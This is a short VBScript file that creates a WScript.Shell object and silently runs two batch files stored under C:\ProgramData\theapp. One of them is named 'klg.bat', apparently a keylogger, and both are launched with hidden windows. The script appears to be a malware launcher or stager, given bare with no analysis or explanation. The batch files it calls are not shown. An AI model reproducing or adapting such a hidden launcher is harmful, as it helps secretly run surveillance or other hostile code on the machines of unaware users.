Dim WshShell
Dim obj
Set WshShell = WScript.CreateObject("WScript.Shell") 
obj = WshShell.Run("C:\ProgramData\theapp\klg.bat", 0)
WScript.Sleep 1000
obj = WshShell.Run("C:\ProgramData\theapp\theapp.bat", 0)
set WshShell = Nothing 